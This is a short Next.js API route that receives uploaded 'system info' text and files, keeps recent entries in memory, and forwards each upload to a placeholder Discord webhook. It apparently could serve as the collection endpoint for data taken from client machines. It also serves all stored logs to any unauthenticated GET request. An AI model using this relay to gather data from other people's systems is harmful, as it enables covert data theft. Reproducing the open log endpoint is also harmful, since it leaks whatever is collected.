// pages/api/log.js
import formidable from 'formidable';
import fs from 'fs';
import fetch from 'node-fetch';

export const config = {
  api: {
    bodyParser: false,
  },
};

let logs = [];

export default async function handler(req, res) {
  if (req.method === 'GET') {
    return res.status(200).json(logs);
  }

  const form = formidable({ multiples: true });
  form.parse(req, async (err, fields, files) => {
    if (err) {
      console.error(err);
      return res.status(500).json({ error: 'Failed to parse form' });
    }

    const info = fields.content || 'No system info';
    const file = files.file;

    let fileData;
    if (file && fs.existsSync(file.filepath)) {
      fileData = fs.readFileSync(file.filepath);
    }

    const logEntry = {
      time: new Date().toISOString(),
      info,
      fileName: file?.originalFilename || 'No file',
    };

    logs.push(logEntry);
    if (logs.length > 50) logs.shift();

    try {
      const webhook = 'YOUR_DISCORD_WEBHOOK_HERE';
      const formData = new FormData();
      if (fileData) {
        formData.append('file', new Blob([fileData]), logEntry.fileName);
      }
      formData.append('content', `\`\`\`${info}\`\`\``);
      await fetch(webhook, { method: 'POST', body: formData });
    } catch (e) {
      console.error('Failed to send to Discord', e);
    }

    res.status(200).json({ success: true });
  });
}
